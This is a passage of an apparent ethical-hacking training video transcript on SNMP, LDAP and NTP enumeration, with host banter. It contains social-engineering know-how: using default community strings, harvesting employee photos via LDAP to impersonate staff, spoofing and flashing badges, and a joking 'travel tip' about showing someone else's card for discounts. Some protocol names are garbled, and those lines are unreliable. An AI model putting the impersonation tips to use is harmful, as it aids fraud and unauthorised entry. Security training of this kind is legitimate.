of what we did in our\n\n18\n00:00:52.840 --> 00:00:53.402\nfirst episode.\n\n19\n00:00:53.402 --> 00:00:57.344\nWe're gonna also add some depth to\nthat conversation, go a little deeper,\n\n20\n00:00:57.344 --> 00:01:02.190\ntalk about the different enumeration,\nexamples, how do we do SNMP enumeration.\n\n21\n00:01:02.190 --> 00:01:04.975\nMore importantly we've shown you how to\ndo that, but what did we actually do?\n\n22\n00:01:04.975 --> 00:01:07.400\nWhat is the MIB database, for instance?\n\n23\n00:01:07.400 --> 00:01:08.140\nWhy is it important?\n\n24\n00:01:08.140 --> 00:01:09.230\nThings of that nature.\n\n25\n00:01:09.230 --> 00:01:10.949\nWe'll fill in the gaps so\nto speak, as we go.\n\n26\n00:01:10.949 --> 00:01:12.358\nAnd Mike will continue\nto shuffle papers and\n\n27\n00:01:12.358 --> 00:01:13.661\nmake noise while I'm talking-\n>> [LAUGH]\n\n28\n00:01:13.661 --> 00:01:15.375\n>> Cuz he's very good at that.\n\n29\n00:01:15.375 --> 00:01:18.786\nAnd we'll allow him to do those things and\nnot try to be distracted.\n\n30\n00:01:18.786 --> 00:01:19.286\nBad host-\n>> [LAUGH]\n\n31\n00:01:19.286 --> 00:01:20.555\n>> Don't do that anymore.\n\n32\n00:01:20.555 --> 00:01:24.540\nSo let's talk a little bit about some of\nthe enumeration techniques that we've seen\n\n33\n00:01:24.540 --> 00:01:28.840\nand/or have discussed, and\nlet's go as we say one level deeper.\n\n34\n00:01:28.840 --> 00:01:31.240\nSo with regards to SNMP enumeration,\n\n35\n00:01:31.240 --> 00:01:33.990\nsimple network management protocols\nwe've talked about before.\n\n36\n00:01:33.990 --> 00:01:35.406\nWe talk about using SNMP and\n\n37\n00:01:35.406 --> 00:01:38.867\nwe have in the past talked about\nit as being a management protocol.\n\n38\n00:01:38.867 --> 00:01:41.926\nWe reach out,\nwe can remotely connect to a machine,\n\n39\n00:01:41.926 --> 00:01:46.250\ninteract with it, remotely administer,\nand understand what is there.\n\n40\n00:01:46.250 --> 00:01:50.056\nWe can enumerate user accounts and\ndevice information using SNMP.\n\n41\n00:01:50.056 --> 00:01:53.248\nHow many versions of the protocol\nof SNMP exist, by the way?\n\n42\n00:01:53.248 --> 00:01:55.662\n>> Four.\n>> Four versions, are you sure?\n\n43\n00:01:55.662 --> 00:01:56.296\n>> No.\n>> [LAUGH]\n\n44\n00:01:56.296 --> 00:01:57.536\n>> No, that would be wrong, by the way.\n\n45\n00:01:57.536 --> 00:01:58.880\n>> [LAUGH]\n>> There are three, but that's okay.\n\n46\n00:01:58.880 --> 00:02:01.822\nThat's not a problem, I caught Mike in\nthe middle of doing something else.\n\n47\n00:02:01.822 --> 00:02:04.371\n>> [LAUGH]\n>> He was just automatically responding.\n\n48\n00:02:04.371 --> 00:02:07.240\nWhenever he doesn't know the answer to the\nquestion, he looks at you and goes, four.\n\n49\n00:02:07.240 --> 00:02:10.662\nThat's his standard, I'm not sure deer\nin the headlights kind of answer.\n\n50\n00:02:10.662 --> 00:02:11.500\n>> Exactly.\n\n51\n00:02:11.500 --> 00:02:13.490\n>> So SMTP version 1,\nversion 2, version 3.\n\n52\n00:02:13.490 --> 00:02:14.630\nInteresting thing about them,\n\n53\n00:02:14.630 --> 00:02:20.020\nversion 1 totally lack of security\nfrom the perspective of password and\n\n54\n00:02:20.020 --> 00:02:23.420\nusername, community strength protection,\nno encryption of any kind.\n\n55\n00:02:23.420 --> 00:02:26.960\nSo we're using later versions these days,\nto be able to be more secure.\n\n56\n00:02:26.960 --> 00:02:30.974\nBut regardless of version, we can use\nthis to enumerate user information,\n\n57\n00:02:30.974 --> 00:02:32.238\nmachine information.\n\n58\n00:02:32.238 --> 00:02:36.140\nWe do have a read community string,\nand a read write community string.\n\n59\n00:02:36.140 --> 00:02:38.950\nWe just want to be aware of that,\nwe talked about using default community\n\n60\n00:02:38.950 --> 00:02:40.870\nstrings I think in one\nof our last episodes.\n\n61\n00:02:40.870 --> 00:02:44.316\nTalked about the fact that public and\nprivate are the default community strings.\n\n62\n00:02:44.316 --> 00:02:47.956\nAnd that way if they are not changed\nit's pretty simple, pretty easy for\n\n63\n00:02:47.956 --> 00:02:50.800\nus to attach to a device and\npotentially get into it.\n\n64\n00:02:50.800 --> 00:02:55.680\nSo we do wanna know what\nis good candidates and\n\n65\n00:02:55.680 --> 00:02:58.870\nprofessionals that we should be going\nout as we should with any system.\n\n66\n00:02:58.870 --> 00:03:01.840\nAnd profiling it,\none of the reason we do S&P enumerations.\n\n67\n00:03:01.840 --> 00:03:05.215\nWould be to look for the use of\ndefault configurations, look for\n\n68\n00:03:05.215 --> 00:03:08.728\nthe use of earlier versions of\nthe protocol that may not be secure.\n\n69\n00:03:08.728 --> 00:03:13.606\nYou would joked around in the last episode\nwhen we're doing the lab demonstrations at\n\n70\n00:03:13.606 --> 00:03:15.919\nsome point we scanned and TFTP running.\n\n71\n00:03:15.919 --> 00:03:19.197\nAnd we said, look,\nthere's probably Cisco gear going on, and\n\n72\n00:03:19.197 --> 00:03:21.128\nwe were joking around about going in and\n\n73\n00:03:21.128 --> 00:03:24.305\nmessing around with those that\nwere going on studio number one.\n\n74\n00:03:24.305 --> 00:03:27.127\nTurns out at the time there was nothing\ngong on with studio one because they were\n\n75\n00:03:27.127 --> 00:03:27.830\nhaving problems.\n\n76\n00:03:27.830 --> 00:03:30.380\nBut the point is,\nwe joked around about going in there and\n\n77\n00:03:30.380 --> 00:03:32.000\npotentially hacking into that machine.\n\n78\n00:03:32.000 --> 00:03:35.120\nBecause we saw that TFTP was running and\nwe figured well, there is probably\n\n79\n00:03:35.120 --> 00:03:39.430\nsomething going on and it's probably\na CISCO solution, we could take a look.\n\n80\n00:03:39.430 --> 00:03:41.760\nWe could of actually, and\nthat would not have been hard to do,\n\n81\n00:03:41.760 --> 00:03:44.950\nwouldn't have been ethical, we didn't\ndo it of course, but we could of.\n\n82\n00:03:44.950 --> 00:03:48.163\nBut one of the things we would of found\nif we had done that and gone through and\n\n83\n00:03:48.163 --> 00:03:48.836\ndelve deeper.\n\n84\n00:03:48.836 --> 00:03:52.677\nWe would've looked at the SNP enumeration\non or in one of those tools and\n\n85\n00:03:52.677 --> 00:03:57.330\nlooked at it and seen what version of SNP\nwas running and if it was indeed running.\n\n86\n00:03:57.330 --> 00:04:00.401\nWere there community strings that were\navailable that we could easily guess?\n\n87\n00:04:00.401 --> 00:04:03.859\nCan we then gain control of that system,\nif we were able to,\n\n88\n00:04:03.859 --> 00:04:08.033\nby using the community string,\nwhich essentially is like a password?\n\n89\n00:04:08.033 --> 00:04:11.055\nIt allows us,then to get in and\nto modify or\n\n90\n00:04:11.055 --> 00:04:16.030\nat least work with the configuration of\nSNMP and perhaps information around you.\n\n91\n00:04:16.030 --> 00:04:18.785\nWe also wanna think about the MIB,\nnot the Men in Black-\n\n92\n00:04:18.785 --> 00:04:19.286\n>> [LAUGH]\n\n93\n00:04:19.286 --> 00:04:21.280\n>> But the Management Information Base.\n\n94\n00:04:21.280 --> 00:04:22.800\nSee now,\nthat's a good movie that they made\n\n95\n00:04:22.800 --> 00:04:23.331\nthree of-\n>> Yeah.\n\n96\n00:04:23.331 --> 00:04:24.420\n>> And was actually awesome, right?\n\n97\n00:04:24.420 --> 00:04:25.843\n>> They were.\n>> We were talking yesterday, right?\n\n98\n00:04:25.843 --> 00:04:27.815\n>> Yeah.\n>> In one of the prior episodes about\n\n99\n00:04:27.815 --> 00:04:29.550\nthe redo on Independence Day.\n\n100\n00:04:29.550 --> 00:04:30.181\n>> Independence Day, yes.\n\n101\n00:04:30.181 --> 00:04:32.006\n>> We weren't sure if it\nwas gonna be good or not.\n\n102\n00:04:32.006 --> 00:04:36.404\nI had the opinion I wasn't confident, but\nMikes the eternal optimist he said, maybe.\n\n103\n00:04:36.404 --> 00:04:39.586\n>> [LAUGH]\n>> So we'll see, but there's a movie,\n\n104\n00:04:39.586 --> 00:04:40.726\nyou did three.\n\n105\n00:04:40.726 --> 00:04:45.673\nAnd while all of them weren't as great as\nthe first one, a total coherent story.\n\n106\n00:04:45.673 --> 00:04:47.215\nYou kinda find out in the end,\n\n107\n00:04:47.215 --> 00:04:50.450\nthat the Will Smith character\nwas there at the beginning.\n\n108\n00:04:50.450 --> 00:04:54.482\nAs a kid, his father gets killed,\nthat's why the Tommy Lee Jones character\n\n109\n00:04:54.482 --> 00:04:55.049\nkinda-\n>> Kinda brought him in.\n\n110\n00:04:55.049 --> 00:04:55.575\n>> Brings some in.\n\n111\n00:04:55.575 --> 00:04:57.416\n>> Yep.\n>> I spoiled it for everybody.\n\n112\n00:04:57.416 --> 00:04:59.166\n>> [LAUGH]\n>> Everybody who had not seen it,\n\n113\n00:04:59.166 --> 00:04:59.690\nyou're done.\n\n114\n00:04:59.690 --> 00:05:00.267\nBig spoiler alert.\n\n115\n00:05:00.267 --> 00:05:01.511\n>> [LAUGH]\n>> Sorry about that.\n\n116\n00:05:01.511 --> 00:05:02.635\n>> We'll do that in post.\n\n117\n00:05:02.635 --> 00:05:04.397\nWe'll put spoiler alert at there.\n\n118\n00:05:04.397 --> 00:05:08.395\nPut a big red X through that part, do not\nlisten if you have not seen the movies.\n\n119\n00:05:08.395 --> 00:05:10.890\nBut there's an example of\na movie that actually did well,\n\n120\n00:05:10.890 --> 00:05:14.660\nthat did three coherent stories and\nactually was like a cool,\n\n121\n00:05:14.660 --> 00:05:16.090\nI don't know where I'm going with this,\nby the way.\n\n122\n00:05:16.090 --> 00:05:17.690\nWe're going to keep going,\ntalk about other stuff.\n\n123\n00:05:17.690 --> 00:05:20.090\nAnyway that's the kind of thing where\nyou want to do a sequel, right?\n\n124\n00:05:20.090 --> 00:05:20.652\n>> Yes.\n>> And so\n\n125\n00:05:20.652 --> 00:05:23.339\nMIB is Management Information Base,\nnot Men in Black\n\n126\n00:05:23.339 --> 00:05:24.864\n>> And as I said, if you haven't seen it,\n\n127\n00:05:24.864 --> 00:05:25.940\nall three are good.\n\n128\n00:05:25.940 --> 00:05:29.940\nBut management information base,\nthis is the database that we have\n\n129\n00:05:29.940 --> 00:05:34.653\nthat is essentially gonna allow us to\nunderstand information about the topic.\n\n130\n00:05:34.653 --> 00:05:36.482\nOr in this case about the object, and\n\n131\n00:05:36.482 --> 00:05:40.800\nall the information that is available\nabout it hierarchically, as we manage it.\n\n132\n00:05:40.800 --> 00:05:44.522\nThere are what are known as object\nidentifiers, OIDs that are listed out\n\n133\n00:05:44.522 --> 00:05:48.133\nthere, and we actually can find out\ninformation about the hardware.\n\n134\n00:05:48.133 --> 00:05:52.431\nAnd what we're managing based on this\nhierarchical representation of data in\n\n135\n00:05:52.431 --> 00:05:53.320\nthe MIB.\n\n136\n00:05:53.320 --> 00:05:55.179\nCan you actually ask me if\nwe would have something and\n\n137\n00:05:55.179 --> 00:05:56.540\nI would have you go out and look for it?\n\n138\n00:05:56.540 --> 00:05:57.416\nAnd I said no, and I lied.\n\n139\n00:05:57.416 --> 00:05:58.284\n>> Of course.\n>> As usual let's go out-\n\n140\n00:05:58.284 --> 00:05:58.927\n>> [LAUGH]\n\n141\n00:05:58.927 --> 00:06:00.256\n>> And do something quick off the cuff.\n\n142\n00:06:00.256 --> 00:06:02.149\nDo a quick Google search,\ntell us when you're ready.\n\n143\n00:06:02.149 --> 00:06:05.835\nWon't go to your machine until you do,\non a Management Information Base, an MIB.\n\n144\n00:06:05.835 --> 00:06:09.080\nAnd let's just bring something up\npeople could take a look at real quick.\n\n145\n00:06:09.080 --> 00:06:10.970\nBut we have two types of\nmanaged objects out there.\n\n146\n00:06:10.970 --> 00:06:12.630\nMike will tell us when he's ready and\n\n147\n00:06:12.630 --> 00:06:14.470\nyou can see what he's doing\nwith the Google search.\n\n148\n00:06:14.470 --> 00:06:16.570\nWe've got scalar or scalar objects,\n\n149\n00:06:16.570 --> 00:06:20.000\ndepending on how you choose to\npronounce them, and tabular objects.\n\n150\n00:06:20.000 --> 00:06:22.960\nThe scalar object is\na single instance object.\n\n151\n00:06:22.960 --> 00:06:25.210\nIt's gonna tell us one\npiece of information or\n\n152\n00:06:25.210 --> 00:06:27.795\ndefine information about a single object.\n\n153\n00:06:27.795 --> 00:06:30.445\nTabular objects to find\nmultiple related objects,\n\n154\n00:06:30.445 --> 00:06:32.585\nin groups that are known as MIB tables.\n\n155\n00:06:32.585 --> 00:06:33.230\nDid you have something?\n\n156\n00:06:33.230 --> 00:06:34.235\nI saw it come up for a second.\n\n157\n00:06:34.235 --> 00:06:35.468\n>> Not yet.\n\n158\n00:06:35.468 --> 00:06:37.659\n>> Okay, cuz I saw you had the Microsoft\nitem, but then it went away.\n\n159\n00:06:37.659 --> 00:06:38.171\n>> Yeah.\n>> So all right,\n\n160\n00:06:38.171 --> 00:06:39.835\nwell anyway when Mike gets it,\nit'll bring it up.\n\n161\n00:06:39.835 --> 00:06:44.228\nIt's not a big deal, but just keep in mind\nthat the MIB is gonna be very important\n\n162\n00:06:44.228 --> 00:06:47.783\nfor us to associate with the SNMP\nprotocol, and the use of SNMP.\n\n163\n00:06:47.783 --> 00:06:50.914\nBecause this is gonna have all\nthe formal description information for\n\n164\n00:06:50.914 --> 00:06:54.110\nall the network objects that\nare available to be managed through SNMP.\n\n165\n00:06:54.110 --> 00:06:57.585\nSo centrally the reference\ndatabase that we have to go use in\n\n166\n00:06:57.585 --> 00:07:00.575\norder to understand what\nwe can find through SNMP,\n\n167\n00:07:00.575 --> 00:07:05.030\nhow we can manage information, and\nwhat we ultimately can do with it.\n\n168\n00:07:05.030 --> 00:07:08.544\nAnd we have object types, scalar or\nscalar, depending on how you pronounce it,\n\n169\n00:07:08.544 --> 00:07:09.539\nand tabular objects.\n\n170\n00:07:09.539 --> 00:07:13.425\nAnd as I said, knowing the difference\nbetween those may be important,\n\n171\n00:07:13.425 --> 00:07:16.240\nmay be good for\nyou to just have awareness of.\n\n172\n00:07:16.240 --> 00:07:18.240\nLots of different SNMP tools out there.\n\n173\n00:07:18.240 --> 00:07:20.260\nWe've demoed a bunch in\nour lab environment,\n\n174\n00:07:20.260 --> 00:07:25.460\nbut things like the SNMP Enumeration Tool\ncalled the engineer's toolset.\n\n175\n00:07:25.460 --> 00:07:28.630\nThere are just a whole bunch\nout there that you can use.\n\n176\n00:07:28.630 --> 00:07:31.920\nSNMP Scanner, what else?\n\n177\n00:07:31.920 --> 00:07:34.410\nSpice works has a good\nset of tools out there.\n\n178\n00:07:35.740 --> 00:07:39.410\nSN scans another good one that's out\nthere from McAfee, I think these days.\n\n179\n00:07:39.410 --> 00:07:43.020\nAlthough that stuff changes on such a\nregular basis it's hard to know for sure.\n\n180\n00:07:43.020 --> 00:07:44.640\nBut you could go out and\nfind those tools, and\n\n181\n00:07:44.640 --> 00:07:46.312\nMike does a good job of capturing them for\nyou.\n\n182\n00:07:46.312 --> 00:07:49.040\nAnd making sure you're aware of them\nas we go through the show notes.\n\n183\n00:07:49.040 --> 00:07:49.935\nIf you can't find it don't.\n\n184\n00:07:49.935 --> 00:07:50.884\n>> Yeah, no real good examples for me.\n\n185\n00:07:50.884 --> 00:07:52.270\n>> Yeah, it's not gonna come up,\nit's not a big deal.\n\n186\n00:07:52.270 --> 00:07:53.651\nIt's just something to be aware of,\n\n187\n00:07:53.651 --> 00:07:55.794\nI just thought it'd be nice if\nwe had a quick link for you.\n\n188\n00:07:55.794 --> 00:07:58.143\nBut you guys can go out and\nread up on it on your own.\n\n189\n00:07:58.143 --> 00:08:01.246\nCertainly, and I think we saw that\nposted up on the chat window there,\n\n190\n00:08:01.246 --> 00:08:02.361\nmaybe just a Wikipedia.\n\n191\n00:08:02.361 --> 00:08:03.825\n>> Yeah.\n>> Starting point just to give you\n\n192\n00:08:03.825 --> 00:08:06.534\na general sense of what MIB are,\nwhich would be a good place to start.\n\n193\n00:08:06.534 --> 00:08:10.250\nSo thank you sir, always good to\nhave people keeping an eye on us.\n\n194\n00:08:10.250 --> 00:08:12.577\nMaking sure they're posted\nuseful information there.\n\n195\n00:08:12.577 --> 00:08:14.704\nSo Ben, thank you very much for\nputting that up.\n\n196\n00:08:14.704 --> 00:08:18.390\nSo LDAP enumeration, another area I want\nto enumerate or at least talk about.\n\n197\n00:08:18.390 --> 00:08:22.278\nYou saw me use Hyena in the last\nepisode when we were doing lab work.\n\n198\n00:08:22.278 --> 00:08:24.214\nIf you have come in and\ntaken a look at that.\n\n199\n00:08:24.214 --> 00:08:28.040\nIf not it's actually a really cool set\nof tools to look at and a cool demo.\n\n200\n00:08:28.040 --> 00:08:31.272\nWe used it to go out and\ndo some LDAP enumeration.\n\n201\n00:08:31.272 --> 00:08:34.320\nWe went out and LDAP Lightweight\nDirectory Access Protocol.\n\n202\n00:08:34.320 --> 00:08:38.240\nThe standard protocol that we use to\nbe able to drive directory services\n\n203\n00:08:38.240 --> 00:08:42.560\nin Microsoft we implement it known as\nADDS, Active Directory Directory Service.\n\n204\n00:08:42.560 --> 00:08:47.226\nWe can use open LDAP, so we can use a\nnonproprietary open source LDAP provider.\n\n205\n00:08:47.226 --> 00:08:50.912\nBut we're gonna go out and be able to\nuse LDAP to drive all the directory\n\n206\n00:08:50.912 --> 00:08:53.520\nservice function that we engage in and\nuse.\n\n207\n00:08:53.520 --> 00:08:56.780\nEssentially managing users and groups,\nand all that stuff, computers.\n\n208\n00:08:56.780 --> 00:08:59.868\nAnd I showed you using the tool you\ncan program the users, the groups.\n\n209\n00:08:59.868 --> 00:09:03.930\nWe can profile the individual user\ninformation, create a modify users,\n\n210\n00:09:03.930 --> 00:09:07.139\nlook at the OU structure,\nbe able to look at the policies,\n\n211\n00:09:07.139 --> 00:09:11.260\nbe able to look at the settings,\nall sorts of stuff would be out there.\n\n212\n00:09:11.260 --> 00:09:14.070\nAnd we saw that Hyena's kinda\nthat Swiss army knife tool\n\n213\n00:09:14.070 --> 00:09:15.910\nthat will let us do a bunch\nof different stuff.\n\n214\n00:09:15.910 --> 00:09:17.784\nBut there are many, many tools out there.\n\n215\n00:09:17.784 --> 00:09:21.916\nOne of the interesting things with LDAP\nnumeration tools I find when I do pen\n\n216\n00:09:21.916 --> 00:09:23.106\ntesting sometimes.\n\n217\n00:09:23.106 --> 00:09:26.982\nSo a lot of my customers are going to,\nbecause they're big companies,\n\n218\n00:09:26.982 --> 00:09:29.980\nwe're talking thousands\nof employees globally.\n\n219\n00:09:29.980 --> 00:09:32.973\nImagine for\ninstance a company the size of Microsoft.\n\n220\n00:09:32.973 --> 00:09:36.632\nFloats around 80 to 90,000 people\nworldwide at a given time,\n\n221\n00:09:36.632 --> 00:09:40.115\nprobably around 85,000 depending\non the particular year.\n\n222\n00:09:40.115 --> 00:09:43.893\nAnd how many people that they may be\nemploying in certain industries as\n\n223\n00:09:43.893 --> 00:09:46.270\nthey buy up and perhaps divest themselves.\n\n224\n00:09:46.270 --> 00:09:49.420\nBut on average they run about\n80 to 85,000 users worldwide.\n\n225\n00:09:49.420 --> 00:09:52.370\nImagine working at a company like that,\nyou probably don't know most\n\n226\n00:09:52.370 --> 00:09:55.470\nof the people that you're on the phone\ntalking with on a conference call or\n\n227\n00:09:55.470 --> 00:09:57.250\nthings like that on a regular basis.\n\n228\n00:09:57.250 --> 00:09:59.472\nUnless they're in your immediate team and\nyour geography.\n\n229\n00:09:59.472 --> 00:10:01.700\nThere's so many people you\njust don't know who they are.\n\n230\n00:10:01.700 --> 00:10:05.011\nSo when I work for them, and\nin general even to this day,\n\n231\n00:10:05.011 --> 00:10:08.192\npeople have badges like they\ndo in all big companies.\n\n232\n00:10:08.192 --> 00:10:11.132\nAnd you got your picture on badge and all\nthat but again, people don't know that and\n\n233\n00:10:11.132 --> 00:10:12.450\ndon't know who you are.\n\n234\n00:10:12.450 --> 00:10:14.376\nAnd so one of the things you\ncan do is you can look them up.\n\n235\n00:10:14.376 --> 00:10:16.651\nAnd now it's Skype for\nBusiness, used to be Link.\n\n236\n00:10:16.651 --> 00:10:19.846\nBut you would look them up in the Active\nDirectory and or in Skype or Link.\n\n237\n00:10:19.846 --> 00:10:23.090\nAnd you'd see a picture in the profile and\nsee all that stuff and all that's there.\n\n238\n00:10:23.090 --> 00:10:26.407\nThat's all stored in Active Directory,\nstored in an LDAP Directory.\n\n239\n00:10:26.407 --> 00:10:29.387\nWhen we use LDAP enumeration\ntools as we're hacking,\n\n240\n00:10:29.387 --> 00:10:33.210\none of the things hackers look to\ndo is to find that information.\n\n241\n00:10:33.210 --> 00:10:35.670\nWe can download those\npictures with certain tools.\n\n242\n00:10:35.670 --> 00:10:39.110\nThe reason for that is, it's not only good\nto know the information about the person,\n\n243\n00:10:39.110 --> 00:10:40.550\nbut if you know them by sight,\n\n244\n00:10:40.550 --> 00:10:43.250\nyou can leverage that into\na social engineering attack.\n\n245\n00:10:43.250 --> 00:10:47.200\nBecause now you can find that person and\ngo actually interact with them cuz you\n\n246\n00:10:47.200 --> 00:10:51.650\nhave a name and a face assentially, and so\nnow you can actually pretend to be them.\n\n247\n00:10:51.650 --> 00:10:53.804\nOr you can create an ID-\n>> Right.\n\n248\n00:10:53.804 --> 00:10:55.263\n[LAUGH]\n>> And have the picture,\n\n249\n00:10:55.263 --> 00:10:58.982\nbecause you're going to company\noffice x in this country.\n\n250\n00:10:58.982 --> 00:11:01.070\nThey're from company office\ny in another country,\n\n251\n00:11:01.070 --> 00:11:02.880\nnobody there knows what they look like.\n\n252\n00:11:02.880 --> 00:11:05.791\nYou show up with what approximates\na badge and an ID and\n\n253\n00:11:05.791 --> 00:11:09.168\nyou may be able to spoof a badge,\nit may or may not be hard to do.\n\n254\n00:11:09.168 --> 00:11:11.950\nWe have smart cards for\nmost of what we do today.\n\n255\n00:11:11.950 --> 00:11:18.400\nAnd I don't have it with me, but my\nMicrosoft ID for instance is a smart card.\n\n256\n00:11:18.400 --> 00:11:22.340\nIt's got a picture printed on\nthe front with my name, Microsoft and\n\n257\n00:11:22.340 --> 00:11:25.970\nit's color coded depending on the kind\nof employee you are blue, orange,\n\n258\n00:11:25.970 --> 00:11:29.150\npurple, etc, and\nit's got a chip embedded in the back.\n\n259\n00:11:29.150 --> 00:11:31.870\nSo it's got information\ndigitally stored about me.\n\n260\n00:11:31.870 --> 00:11:33.688\nThat is gonna be hard to spoof, but\n\n261\n00:11:33.688 --> 00:11:36.957\nspoofing the front of it just\nto quickly flash it at somebody.\n\n262\n00:11:36.957 --> 00:11:40.931\nAs you're piggybacking on your way in the\ndoor because of a card swipe that somebody\n\n263\n00:11:40.931 --> 00:11:43.844\nthat's authorized to be there shows you,\nis not hard to do.\n\n264\n00:11:43.844 --> 00:11:47.080\nAnd I'm not suggesting that it'll\nbe easy to spoof a Microsoft ID.\n\n265\n00:11:47.080 --> 00:11:49.829\nI'm must point out, that depending\non who you're flashing it to,\n\n266\n00:11:49.829 --> 00:11:52.397\nthey don't put it on a card reader\nall the time and validate it.\n\n267\n00:11:52.397 --> 00:11:55.623\nSo a lot of times I get asked to show\nthat ID when I show up to events,\n\n268\n00:11:55.623 --> 00:11:56.578\nthings like that.\n\n269\n00:11:56.578 --> 00:11:57.989\nPeople just want to see it.\n\n270\n00:11:57.989 --> 00:11:58.530\n>> Right.\n\n271\n00:11:58.530 --> 00:12:00.277\n>> Yeah, you belong here?\n\n272\n00:12:00.277 --> 00:12:00.855\nOkay, great.\n\n273\n00:12:00.855 --> 00:12:02.367\nYou got that here, no problem go ahead.\n\n274\n00:12:02.367 --> 00:12:05.240\nAround here working with Microsoft\nat a trade show or something.\n\n275\n00:12:05.240 --> 00:12:05.860\nGreat you got an ID?\n\n276\n00:12:05.860 --> 00:12:06.401\nAbsolutely, here you go.\n\n277\n00:12:06.401 --> 00:12:07.465\nGreat, go in.\n\n278\n00:12:07.465 --> 00:12:10.170\nThey're not gonna put that in a card\nreader and validate who we are.\n\n279\n00:12:10.170 --> 00:12:13.473\nYou go to a Microsoft office you've got to\npresent that to the person at the front\n\n280\n00:12:13.473 --> 00:12:15.311\ndesk, they scan that and\nput it in a reader.\n\n281\n00:12:15.311 --> 00:12:19.539\nIf it doesn't show yes, active and\nallow, they don't let you in.\n\n282\n00:12:19.539 --> 00:12:21.700\nThey're obviously tight on security.\n\n283\n00:12:21.700 --> 00:12:24.440\nBut in other areas,\nnobody know what that means.\n\n284\n00:12:24.440 --> 00:12:25.201\nThey just know it's got a name on\n\n285\n00:12:25.201 --> 00:12:25.786\nthe front-\n>> Right.\n\n286\n00:12:25.786 --> 00:12:26.856\n>> And it looks official.\n\n287\n00:12:26.856 --> 00:12:28.284\nSame thing with any of the big vendors.\n\n288\n00:12:28.284 --> 00:12:32.410\nSo you may be able to use that\ninformation to propagate an attack.\n\n289\n00:12:32.410 --> 00:12:36.584\nVery easily and leverage that piece of\ninformation through LDAP enumeration to\n\n290\n00:12:36.584 --> 00:12:40.706\nthen go into a social engineering attack\nand be able to impersonate somebody.\n\n291\n00:12:40.706 --> 00:12:45.027\nFor instance when I show up, and I do\nas I've told you a lot of traveling for\n\n292\n00:12:45.027 --> 00:12:45.529\nmy job.\n\n293\n00:12:45.529 --> 00:12:48.988\nWhen I show up at a hotel and\nif somebody's made a reservation for me,\n\n294\n00:12:48.988 --> 00:12:52.982\nthe first thing I'll made sure I check on\nis saying did we get a good price, a good\n\n295\n00:12:52.982 --> 00:12:56.766\ndeal or can we get a better price cuz I\nwork for so many different companies?\n\n296\n00:12:56.766 --> 00:12:58.954\nWe've got negotiated deals\nwith all sorts of vendors.\n\n297\n00:12:58.954 --> 00:13:02.265\nSo if I'm there working on behalf of\none of these vendors, and I say hey,\n\n298\n00:13:02.265 --> 00:13:04.795\nI'm with so and so,\ndid they book you on to that rate?\n\n299\n00:13:04.795 --> 00:13:06.855\nNo, we have a corporate discount,\nlet me do that for you.\n\n300\n00:13:06.855 --> 00:13:08.698\nDo you have an ID?\nAll I have to do is show my ID.\n\n301\n00:13:08.698 --> 00:13:11.532\nThey don't validate it,\nthey don't know who I am.\n\n302\n00:13:11.532 --> 00:13:14.711\nThey just know that it looks official and\nsays yeah, you work for so and so,\n\n303\n00:13:14.711 --> 00:13:16.383\nwouldn't be hard to do that by the way.\n\n304\n00:13:16.383 --> 00:13:18.834\n>> [LAUGH]\n>> Travel tip 101 for you.\n\n305\n00:13:18.834 --> 00:13:21.627\n>> [LAUGH]\n>> And quite honestly they don't even know\n\n306\n00:13:21.627 --> 00:13:24.485\nif it has a picture on it or not, you're\ngonna show it to them without the picture.\n\n307\n00:13:24.485 --> 00:13:26.822\nAnd you got an ID that matches it,\nthat's all they care about.\n\n308\n00:13:26.822 --> 00:13:28.135\nThey don't even know.\n\n309\n00:13:28.135 --> 00:13:30.972\nIt's like showing your AAA card,\nis that really you?\n\n310\n00:13:30.972 --> 00:13:34.553\nYeah, no, it's not,\nI'm not Jeanine Herpset.\n\n311\n00:13:34.553 --> 00:13:35.487\n>> [LAUGH]\n>> That's not me.\n\n312\n00:13:35.487 --> 00:13:36.926\nDo I look like Jeanine?\n\n313\n00:13:36.926 --> 00:13:39.079\nBut I've got it, so\nyou gotta get me the discount.\n\n314\n00:13:39.079 --> 00:13:39.816\n>> That's right.\n\n315\n00:13:39.816 --> 00:13:41.531\n>> So NTP enumeration.\n\n316\n00:13:41.531 --> 00:13:45.321\nAgain, we talked about the value of NTP,\nwe talked about why it's so important.\n\n317\n00:13:45.321 --> 00:13:48.568\nRemember, NTP runs on you\nknow what port NTP runs on?\n\n318\n00:13:48.568 --> 00:13:51.176\n>> Gosh,\nyou quizzed me on that a while ago.\n\n319\n00:13:51.176 --> 00:13:53.101\n>> I quiz you on it every\ntime we get together.\n\n320\n00:13:53.101 --> 00:13:53.742\n>> 123.\n\n321\n00:13:53.742 --> 00:13:56.307\n>> And I would think from five\nversions ago you would remember.\n\n322\n00:13:56.307 --> 00:13:57.751\n>> [LAUGH]\n>> Did you say one what?\n\n323\n00:13:57.751 --> 00:13:58.301\n>> 23.\n\n324\n00:13:58.301 --> 00:13:59.919\n>> 123, absolutely correct.\n\n325\n00:13:59.919 --> 00:14:01.599\nAll right, so you see Pavlov was right.\n\n326\n00:14:01.599 --> 00:14:04.180\n>> [LAUGH]\n>> You can train them it just takes time.\n\n327\n00:14:04.180 --> 00:14:06.361\nAll right, so NTB does run on port 123.\n\n328\n00:14:06.361 --> 00:14:08.310\nIt'll will be on our port\nlist of ports you wanna know.\n\n329\n00:14:08.310 --> 00:14:09.310\nIt is important for\n\n330\n00:14:09.310 --> 00:14:11.670\nyou to make sure you know the ports\nassociated with these services.\n\n331\n00:14:11.670 --> 00:14:13.710\nWe did talk about that,\nvery, very important.\n\n332\n00:14:13.710 --> 00:14:15.580\nLightening ground by the way, SMTP.\n\n333\n00:14:15.580 --> 00:14:16.410\n>> 20.\n\n334\n00:14:16.410 --> 00:14:17.107\n>> Come on.\n\n335\n00:14:17.107 --> 00:14:18.145\n>> No.\n>> You're just gonna like,\n\n336\n00:14:18.145 --> 00:14:19.195\nget out of this studio right now.\n\n337\n00:14:19.195 --> 00:14:22.025\n>> [LAUGH]\n>> Do not come back until you know\n\n338\n00:14:22.025 --> 00:14:24.731\nwhat port SMTP runs on for shame.\n\n339\n00:14:24.731 --> 00:14:27.165\nI'm not letting you talk to people out\nthere and giving them information.\n\n340\n00:14:27.165 --> 00:14:28.461\n>> Wait, did you say SNMP or SMTP?\n\n341\n00:14:28.461 --> 00:14:29.429\n>> I said, SMTP.\n\n342\n00:14:29.429 --> 00:14:30.555\n>> That's 25, I got that one.\n\n343\n00:14:30.555 --> 00:14:32.014\n>> Well, of course it's 25.\n\n344\n00:14:32.014 --> 00:14:32.779\n>> Yeah, that I got.\n\n345\n00:14:32.779 --> 00:14:34.618\n>> It's easy to know after you click\non the 